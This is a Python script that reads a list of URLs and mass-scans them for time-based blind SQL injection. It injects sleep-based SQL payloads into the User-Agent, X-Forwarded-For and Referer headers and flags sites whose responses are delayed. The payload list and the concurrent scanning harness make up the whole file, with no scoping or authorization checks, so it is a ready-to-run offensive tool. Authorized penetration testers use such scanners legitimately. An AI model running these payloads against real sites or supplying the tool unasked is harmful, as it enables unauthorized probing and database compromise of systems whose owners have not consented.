import aiohttp
import asyncio
import time
import os

# SQL Injection Payloads
SQLI_PAYLOADS = [
    ("User-Agent", "'XOR(if(now()=sysdate(),sleep(5),0))XOR'"),
    ("X-Forwarded-For", "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z'"),
    ("Referer", "'+(select*from(select(if(1=1,sleep(20),false)))a)+'"),
    ("User-Agent", "'Mozilla/5.0', (select*from(select(sleep(20)))a) #"),
    (
        "Referer",
        "https://example.com/'+(select*from(select(if(1=1,sleep(20),false)))a)+'",
    ),
]

# Configuration
CONCURRENT_REQUESTS = 10
TIMEOUT = 30  # Maximum response wait time
DELAY_THRESHOLD = 6  # If response takes >6s longer than baseline, likely SQLi

semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)  # Limits concurrent requests

# Stores baseline response times for comparison
baseline_times = {}

# Stores detected SQLi vulnerabilities
sqli_detections = []


async def measure_baseline(session, url):
    """Measure baseline response time for a given URL"""
    async with semaphore:
        try:
            start_time = time.time()
            async with session.get(url, timeout=TIMEOUT) as response:
                elapsed_time = time.time() - start_time
                baseline_times[url] = elapsed_time
                print(f"[⏳] Baseline for {url}: {elapsed_time:.2f}s")
        except asyncio.TimeoutError:
            baseline_times[url] = TIMEOUT
            print(f"[⚠️] Baseline measurement timed out for {url}")
        except aiohttp.ClientError as e:
            print(f"[❌] Baseline error for {url}: {e}")


async def test_sql_injection(session, url):
    """Test time-based SQL injection by injecting payloads into headers"""
    async with semaphore:
        base_time = baseline_times.get(url, 0)
        for header, payload in SQLI_PAYLOADS:
            headers = {header: payload}
            start_time = time.time()

            try:
                async with session.get(
                    url, headers=headers, timeout=TIMEOUT
                ) as response:
                    elapsed_time = time.time() - start_time
                    delay = elapsed_time - base_time

                    if delay > DELAY_THRESHOLD:
                        print(
                            f"[🔥] SQLi Detected: {url} | Header: {header} | Delay: {elapsed_time:.2f}s"
                        )
                        sqli_detections.append((url, header, payload, elapsed_time))
                    else:
                        print(
                            f"[+] Tested {url} | {header} | Delay: {elapsed_time:.2f}s"
                        )

            except asyncio.TimeoutError:
                print(f"[⚠️] Timeout for {url} | {header} | Potential SQLi?")
            except aiohttp.ClientError as e:
                print(f"[❌] Error on {url} | {header}: {e}")


async def main():
    """Main function to handle scanning"""
    file_path = input("Enter the path to your URL list file (e.g., list.txt): ")

    if not os.path.exists(file_path):
        print(f"[-] Error: File '{file_path}' not found!")
        return

    with open(file_path, "r") as file:
        urls = [line.strip() for line in file if line.strip()]

    async with aiohttp.ClientSession() as session:
        # Measure baseline response times
        await asyncio.gather(*(measure_baseline(session, url) for url in urls))

        # Test for SQLi
        await asyncio.gather(*(test_sql_injection(session, url) for url in urls))

    print("\n[✅] Time-Based SQL Injection Scan Completed!")
    print("========== SQL Injection Findings ==========")
    if sqli_detections:
        for url, header, payload, elapsed_time in sqli_detections:
            print(
                f"[🔥] Vulnerable: {url} | Header: {header} | Delay: {elapsed_time:.2f}s"
            )
    else:
        print("[❌] No SQLi vulnerabilities detected.")
    print("===========================================")


if __name__ == "__main__":
    asyncio.run(main())
